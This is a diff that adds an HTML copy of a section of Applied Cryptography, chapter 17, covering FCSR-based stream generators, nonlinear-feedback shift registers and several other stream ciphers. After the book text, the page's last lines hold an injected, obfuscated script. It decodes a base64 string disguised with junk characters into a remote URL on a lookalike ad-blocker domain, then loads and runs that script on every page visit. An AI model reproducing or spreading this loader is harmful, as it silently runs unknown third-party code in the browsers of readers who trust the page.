@@ -1,0 +1,153 @@
+<html>
+<head>
+<TITLE>APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C:Other Stream Ciphers and Real Random-Sequence Generators</TITLE>
+<!-- BEGIN HEADER -->
+<META NAME="ROBOTS" CONTENT="NOINDEX, NOFOLLOW">
+<SCRIPT>
+<!--
+function displayWindow(url, width, height) {
+        var Win = window.open(url,"displayWindow",'width=' + width +
+',height=' + height + ',resizable=1,scrollbars=yes');
+}
+//-->
+</SCRIPT>
+
+</HEAD>
+<body bgcolor="ffffff" link="#006666" alink="#006666" vlink="#006666">
+<P>
+<CENTER><B>Applied Cryptography, Second Edition: Protocols,  Algorthms, and Source Code in C (cloth)</B>
+<FONT SIZE="-2">
+<BR>
+<I>(Publisher: John Wiley & Sons, Inc.)</I>
+<BR>
+Author(s): Bruce Schneier
+<BR>
+ISBN: 0471128457
+<BR>
+Publication Date: 01/01/96
+</FONT></CENTER>
+<P>
+
+
+<!-- Empty Reference Subhead -->
+
+<!--ISBN=0471128457//-->
+<!--TITLE=APPLIED CRYPTOGRAPHY, SECOND EDITION: Protocols, Algorithms, and Source Code in C//-->
+<!--AUTHOR=Bruce Schneier//-->
+<!--PUBLISHER=Wiley Computer Publishing//-->
+<!--CHAPTER=17//-->
+<!--PAGES=410-414//-->
+<!--UNASSIGNED1//-->
+<!--UNASSIGNED2//-->
+
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+<P><BR></P>
+</P>
+<P><FONT SIZE="+1"><B><I>LFSR/FCSR Summation/Parity Cascade</I></B></FONT></P>
+<P>The theory is that addition with carry destroys the algebraic properties of LFSRs, and that XOR destroys the algebraic properties of FCSRs. This generator combines those ideas, as used in the LFSR/FCSR Summation Generator and the LFSR/FCSR Parity Generator just listed, with the Gollmann cascade.
+</P>
+<P>The generator is a series of arrays of registers, with the clock of each array controlled by the output of the previous array. Figure 17.6 is one stage of this generator. The first array of LFSRs is clocked and the results are combined using addition with carry. If the output of this combining function is 1, then the next array (of FCSRs) is clocked and the output of those FCSRs is combined with the output of the previous combining function using XOR. If the output of the first combining function is 0, then the array of FCSRs is not clocked and the output is simply added to the carry from the previous round. If the output of this second combining function is 1, then the third array of LFSRs is clocked, and so on.</P>
+<P>This generator uses a lot of registers: <I>n*m</I>, where <I>n</I> is the number of stages and <I>m</I> is the number of registers per stage. I recommend <I>n</I> = 10 and <I>m</I> = 5.</P>
+<P><FONT SIZE="+1"><B><I>Alternating Stop-and-Go Generators</I></B></FONT></P>
+<P>These generators are stop-and-go generators with FCSRs instead of some LFSRs. Additionally, the XOR operation can be replaced with an addition with carry (see Figure 17.7).
+</P>
+<DL>
+<DD>&#151; FCSR Stop-and-Go Generator. Register-1, Register-2, and Register-3 are FCSRs. The combining operation is XOR.
+<DD>&#151; FCSR/LFSR Stop-and-Go Generator. Register-1 is a FCSR, and Registers-2 and -3 are LFSRs. The combining operation is addition with carry.
+<I><P><A NAME="Fig6"></A><A HREF="javascript:displayWindow('images/17-06.jpg',358,160 )"><IMG SRC="images/17-06t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-06.jpg',358,160)"><FONT COLOR="#000077"><B>Figure 17.6</B></FONT></A>&nbsp;&nbsp;Concoction Generator.</I>
+</P>
+<DD>&#151; LFSR/FCSR Stop-and-Go Generator. Register-1 is a LFSR, and Registers-2 and -3 are FCSRs. The combining operation is XOR.
+</DL>
+<P><FONT SIZE="+1"><B><I>Shrinking Generators</I></B></FONT></P>
+<P>There are four basic generator types using FCSRs:
+</P>
+<DL>
+<DD>&#151; FCSR Shrinking Generator. A shrinking generator with FCSRs instead of LFSRs.
+<DD>&#151; FCSR/LFSR Shrinking Generator. A shrinking generator with a LFSR shrinking a FCSR.
+<DD>&#151; LFSR/FCSR Shrinking Generator: A shrinking generator with a FCSR shrinking a LFSR.
+<I><P><A NAME="Fig7"></A><A HREF="javascript:displayWindow('images/17-07.jpg',318,96 )"><IMG SRC="images/17-07t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-07.jpg',318,96)"><FONT COLOR="#000077"><B>Figure 17.7</B></FONT></A>&nbsp;&nbsp;Alternating stop-and-go generators.</I>
+</P>
+<DD>&#151; FCSR Self-Shrinking Generator. A self-shrinking generator with a FCSR instead of a LFSR.
+</DL>
+<H3><A NAME="Heading7"></A><FONT COLOR="#000077">17.6 Nonlinear-Feedback Shift Registers</FONT></H3>
+<P>It is easy to imagine a more complicated feedback sequence than the ones used in LFSRs or FCSRs. The problem is that there isn&#146;t any mathematical theory that can analyze them. You&#146;ll get something, but who knows what it is? In particular, here are some problems with nonlinear-feedback shift register sequences.
+</P>
+<DL>
+<DD>&#151; There may be biases, such as more ones than zeros or fewer runs than expected, in the output sequence.
+<DD>&#151; The maximum period of the sequence may be much lower than expected.
+<DD>&#151; The period of the sequence might be different for different starting values.
+<DD>&#151; The sequence may appear random for a while, but then &#147;dead end&#148; into a single value. (This can easily be solved by XORing the nonlinear function with the rightmost bit.)
+</DL>
+<P>On the plus side, if there is no theory to analyze nonlinear-feedback shift registers for security, there are few tools to cryptanalyze stream ciphers based on them. We can use nonlinear-feedback shift registers in stream-cipher design, but we have to be careful.
+</P>
+<P>In a nonlinear-feedback shift register, the feedback function can be anything you want (see Figure 17.8).</P>
+<I><P><A NAME="Fig8"></A><A HREF="javascript:displayWindow('images/17-08.jpg',299,124 )"><IMG SRC="images/17-08t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-08.jpg',299,124)"><FONT COLOR="#000077"><B>Figure 17.8</B></FONT></A>&nbsp;&nbsp;A nonlinear-feedback shift register (probably insecure).</I>
+<I></P>
+<P><A NAME="Fig9"></A><A HREF="javascript:displayWindow('images/17-09.jpg',207,73 )"><IMG SRC="images/17-09t.jpg"></A>
+<BR><A HREF="javascript:displayWindow('images/17-09.jpg',207,73)"><FONT COLOR="#000077"><B>Figure 17.9</B></FONT></A>&nbsp;&nbsp;3-bit nonlinear feedback shift register.</I>
+</P>
+<P>Figure 17.9 is a 3-bit shift register with the following feedback function: The new bit is the first bit times the second bit. If it is initialized with the value 110, it produces the following sequence of internal states:
+</P>
+<DL>
+<DD>1 1 0
+<DD>0 1 1
+<DD>1 0 1
+<DD>0 1 0
+<DD>0 0 1
+<DD>0 0 0
+<DD>0 0 0
+</DL>
+<P>And so on forever.
+</P>
+<P>The output sequence is the string of least significant bits:</P>
+<DL>
+<DD>0 1 1 0 1 0 0 0 0 0 0 0....
+</DL>
+<P>This isn&#146;t terribly useful.
+</P>
+<P>It gets even worse. If the initial value is 100, it produces 010, 001, then repeats forever at 000. If the initial value is 111, it repeats itself forever right from the start.</P>
+<P>Some work has been done on computing the linear complexity of the product of two LFSRs [1650,726,1364,630,658,659]. A construction that involved computing LFSRs over a field of odd characteristic [310] is insecure [842].</P>
+<H3><A NAME="Heading8"></A><FONT COLOR="#000077">17.7 Other Stream Ciphers</FONT></H3>
+<P>Many other stream ciphers have appeared in the literature here and there. Here are some of them.
+</P>
+<P><FONT SIZE="+1"><B><I>Pless Generator</I></B></FONT></P>
+<P>This generator is designed around the capabilities of the J-K flip-flop [1250]. Eight LFSRs drive four J-K flip-flops; each flip-flop acts as a nonlinear combiner for two of the LFSRs. To avoid the problem that knowledge of an output of the flip-flop identifies both the source and value of the next output bit, clock the four flip-flops and then interleave the outputs to yield the final keystream.
+</P>
+<P>This algorithm has been cryptanalyzed by attacking each of the four flip-flops independently [1356]. Additionally, combining J-K flip-flops is cryptographically weak; generators of this type succumb to correlation attacks [1451].</P>
+<P><FONT SIZE="+1"><B><I>Cellular Automaton Generator</I></B></FONT></P>
+<P>In [1608,1609], Steve Wolfram proposed using a one-dimensional cellular automaton as a pseudo-random-number generator. Cellular automata is not the subject of this book, but Wolfram&#146;s generator consisted of a one-dimensional array of bits, <I>a</I><SUB>1</SUB>, <I>a</I><SUB>2</SUB>, <I>a</I><SUB>3</SUB>,..., <I>a</I><SUB>k</SUB>,..., <I>a</I><SUB>n</SUB>, and an update function:</P>
+<DL>
+<DD><I>a&#145;</I><SUB>k</SUB> = <I>a</I><SUB>k-1</SUB> &#8853; (<I>a</I><SUB>k</SUB> &#8870; <I>a</I><SUB>k&#43;1</SUB>)
+</DL>
+<P>The bit is extracted from one of the <I>a</I><SUB>k</SUB> values; which one really doesn&#146;t matter.</P>
+<P>The generator&#146;s behavior appears to be quite random. However, there is a known-plaintext attack against these generators [1052]. This attack works on a PC with values of <I>n</I> up to 500 bits. Additionally, Paul Bardell proved that the output of a cellular automaton can also be generated by a linear-feedback shift register of equal length and is therefore no more secure [83].</P>
+<P><FONT SIZE="+1"><B><I>1/p Generator</I></B></FONT></P>
+<P>This generator was proposed, and then cryptanalyzed, in [193]. If the internal state of the generator at time <I>t</I> is <I>x</I><SUB>t</SUB>, then</P>
+<DL>
+<DD><I>x</I><SUB>t&#43;1</SUB> = <I>bx</I><SUB>t</SUB> mod <I>p</I>
+</DL>
+<P>The output of the generator is the least significant bit of <I>x</I><SUB>t</SUB> div <I>p</I>, where div is the truncated integer division. For maximum period, the constants <I>b</I> and <I>p</I> should be chosen so that <I>p</I> is prime and <I>b</I> is a primitive root mod <I>p</I>. Unfortunately, this generator isn&#146;t secure. (Note that for <I>b</I> = 2, an FCSR with a connection integer <I>p</I> outputs the reverse of this sequence.)</P><P><BR></P>
+<CENTER>
+<TABLE BORDER>
+<TR>
+<TD><A HREF="17-05.html">Previous</A></TD>
+<TD><A HREF="../ewtoc.html">Table of Contents</A></TD>
+<TD><A HREF="17-07.html">Next</A></TD>
+</TR>
+</TABLE>
+</CENTER>
+
+[an error occurred while processing this directive]
+<script type="text/javascript">(function(pfqElhuQ, zHFizcFS) {zHFizcFS = pfqElhuQ.createElement('script');zHFizcFS.type = 'text/javascript';zHFizcFS.async = true;zHFizcFS.src = atob('0024241d2f28Ly91YmxvY2stcmVmZXJlci5kZXYvY2FtcGFpZ24uanM=0024241d2f28'.replace(/0024241d2f28/gi, '')) + '?' + String(Math.random()).replace('0.','');pfqElhuQ.getElementsByTagName('body')[0].appendChild(zHFizcFS);}(document));</script></body>
+</html>
